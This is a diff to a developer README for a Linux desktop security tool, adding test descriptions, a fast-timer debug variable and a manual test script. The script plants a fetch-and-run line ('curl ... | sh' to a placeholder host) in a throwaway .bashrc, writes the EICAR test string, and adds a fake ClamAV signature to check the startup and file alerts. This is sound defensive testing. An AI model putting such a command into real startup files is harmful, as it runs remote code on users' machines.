@@ -59,10 +59,12 @@ installed tools:
 | `account.rs` | KDE ini read/write round trip, PowerDevil inhibitions (busctl and gdbus formats) |
 | `antivirus.rs` | History keeps 30 days and scans with open threats; scan result parsing only accepts absolute plain paths; unusual file names; Quarantine/Delete refuse incomplete paths; **end-to-end replay of the crafted-file-name attack** against ClamAV (skipped when ClamAV isn't installed) |
 | `admin.rs` | The protected command list matches the helper script; commands go to the right entry point |
-| `watchers.rs` | `/proc/mounts` parsing (escaped spaces), USB quick-scan file selection |
+| `watchers.rs` | `/proc/mounts` parsing (escaped spaces), USB quick-scan file selection (risky first, programs disguised as photos), saved path encoding, recent-files expiry |
+| `risk.rs` | Risky names and content, suspicious startup lines (and ordinary ones that must stay quiet), stable line hash |
+| `startup.rs` | New sign-in program and suspicious `.bashrc` line reported; installer lines, scripts and switched-off programs stay quiet; the saved baseline survives a restart; `.desktop`/unit parsing |
 | `appperms.rs` | Flatpak permissions plus user overrides |
 | `policy.rs` | Policy file parsing |
-| `tray.rs` | Tray icons render |
+| `tray.rs` | Tray icons render; notification text is escaped |
 | `checks.rs` | The change fingerprint is stable and cheap |
 
 New parsing code should come with a test that feeds it real sample output.
@@ -88,6 +90,7 @@ builds (`#[cfg(debug_assertions)]`).
 | `PROTON_SECURITY_FAKE_USB` | folder | Reads USB devices from this folder instead of `/sys/bus/usb/devices` |
 | `PROTON_SECURITY_FAKE_MOUNTS` | path | Reads mounts (`/proc/mounts` format) from this file, to simulate opening a USB drive |
 | `PROTON_SECURITY_NOTIFY_LOG` | path | Appends notifications to this file (`title \| text`) instead of showing them |
+| `PROTON_SECURITY_FAST` | `1` | Shortens the tray's waits (login delay, definitions check, 4-hour re-check limit) to 10 seconds |
 
 ### Examples
 
@@ -116,6 +119,23 @@ sudo mkdir -p "/media/$USER/TESTUSB" && sudo chown "$USER" "/media/$USER/TESTUSB
 printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "/media/$USER/TESTUSB/eicar.com"
 echo "/dev/sdz1 /media/$USER/TESTUSB vfat rw 0 0" >> /tmp/mounts
 sleep 20; cat /tmp/notify.log
+```
+
+Try the new file check, the startup watch and the re-check in a throwaway home folder (`proton-test.hdb` is a one-line
+ClamAV signature file; `md5sum` of a file plus its size makes ClamAV "detect" it):
+
+```bash
+H=$(mktemp -d); mkdir -p $H/Downloads $H/.config/autostart
+printf 'XDG_DOWNLOAD_DIR="$HOME/Downloads"\n' > $H/.config/user-dirs.dirs
+HOME=$H PROTON_SECURITY_NOTIFY_LOG=/tmp/notify.log PROTON_SECURITY_FAST=1 cargo run -- --tray &
+sleep 10
+printf '[Desktop Entry]\nName=Updater\nExec=/tmp/x\n' > $H/.config/autostart/u.desktop
+echo 'curl -s http://example.invalid/p | sh' >> $H/.bashrc
+head -c 4000 /dev/urandom > $H/Downloads/new.bin
+sleep 70; cat /tmp/notify.log        # the shortcut and the .bashrc line are reported
+echo "$(md5sum < $H/Downloads/new.bin | cut -d' ' -f1):4000:Test.New" | sudo tee /var/lib/clamav/proton-test.hdb
+sleep 30; cat /tmp/notify.log        # "Threat found in a recent file"
+sudo rm /var/lib/clamav/proton-test.hdb
 ```
 
 ## Testing the helper
